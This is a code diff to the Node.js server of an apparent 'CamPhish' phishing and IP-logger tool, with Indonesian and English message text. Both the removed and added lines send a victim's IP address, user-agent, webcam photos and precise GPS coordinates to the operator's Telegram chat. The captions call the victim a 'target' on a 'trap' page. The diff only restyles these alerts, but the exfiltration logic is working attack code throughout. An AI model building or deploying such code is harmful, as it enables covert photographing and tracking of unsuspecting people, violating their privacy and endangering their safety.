@@ -168,11 +168,18 @@ async function startServer() {
 
     if (process.env.TELEGRAM_BOT_TOKEN) {
       const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
-      bot.telegram.sendMessage(chatId, `🚨 <b>TARGET TERKENA IP LOGGER / CAMPHISH!</b> 🚨\n\n` + 
-        `🌐 <b>IP Address:</b> <code>${ip}</code>\n` +
-        `💻 <b>User-Agent:</b> <code>${userAgent}</code>\n` +
-        `🗂 <b>Template:</b> ${templates[tmplId] ? templates[tmplId].name : 'Default/Unknown'}\n\n` +
-        `<i>Sedang mencoba meminta akses Kamera & GPS tingkat lanjut... Jika target menekan "Allow/Izinkan", bot akan otomatis mengirim foto target dan lokasi presisi.</i>`, {parse_mode: 'HTML'}).catch(()=>{});
+      const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+      
+      let msg = `🌟 <b>TARGET HIT DETECTED!</b> 🌟\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `📅 <b>Waktu:</b> <code>${timestamp} WIB</code>\n` +
+                `🌐 <b>IP Address:</b> <code>${ip}</code>\n` +
+                `📁 <b>Template:</b> <code>${templates[tmplId] ? templates[tmplId].name : 'Default'}</code>\n` +
+                `🖥️ <b>User-Agent:</b>\n<code>${userAgent}</code>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `💡 <i>Menunggu data Camera/GPS... Pastikan target menekan <b>"Allow"</b> pada browser mereka.</i>`;
+
+      bot.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
     }
 
     const template = templates[tmplId] || templates['1'];
@@ -195,7 +202,18 @@ async function startServer() {
         const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
         const imageBuffer = Buffer.from(base64Data, 'base64');
         const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
-        bot.telegram.sendPhoto(chatId, { source: imageBuffer }, { caption: `📸 <b>FOTO TARGET (CAMPHISH)</b> 🚨\n\nTarget telah menekan "Allow" pada kamera.`, parse_mode: 'HTML' }).catch(console.error);
+        
+        const caption = `📸 <b>CAPTURE SUCCESS! (CAMPHISH)</b> 📸\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n` +
+                        `✅ <b>Status:</b> Kamera Berhasil Diakses\n` +
+                        `🎭 <b>Wajah Target Terdeteksi!</b>\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n` +
+                        `<i>Data ini diambil secara real-time saat target berada di halaman trap.</i>`;
+
+        bot.telegram.sendPhoto(chatId, { source: imageBuffer }, { 
+          caption, 
+          parse_mode: 'HTML' 
+        }).catch(console.error);
       }
     }
     res.sendStatus(200);
@@ -208,12 +226,21 @@ async function startServer() {
       const { lat, lon, acc } = req.body;
       const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
       const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
-      bot.telegram.sendMessage(chatId, `📍 <b>LOKASI GPS TARGET DITEMUKAN!</b> 🚨\n\n` +
-        `Latitude: <code>${lat}</code>\n` +
-        `Longitude: <code>${lon}</code>\n` +
-        `Akurasi: <b>${acc} meter</b> (Semakin kecil semakin akurat)\n\n` +
-        `<a href="${mapLink}">🗺️ Buka di Google Maps (Titik Pas)</a>\n\n` +
-        `<i>Target telah menekan tombol "Allow Location"! Ini adalah lokasi GPS riil dari perangkat mereka.</i>`, {parse_mode: 'HTML', disable_web_page_preview: true}).catch(()=>{});
+      
+      const msg = `📍 <b>PRECISION LOCATION FOUND!</b> 🚨\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `🛰️ <b>Latitude:</b> <code>${lat}</code>\n` +
+                  `🛰️ <b>Longitude:</b> <code>${lon}</code>\n` +
+                  `🎯 <b>Accuracy:</b> <code>${acc} meter</code>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `🗺️ <a href="${mapLink}">KLIK DISINI UNTUK BUKA GOOGLE MAPS</a>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `⚙️ <i>Info: Ini adalah koordinat GPS asli dari hardware perangkat target.</i>`;
+
+      bot.telegram.sendMessage(chatId, msg, { 
+        parse_mode: 'HTML', 
+        disable_web_page_preview: false 
+      }).catch(console.error);
     }
     res.sendStatus(200);
   });
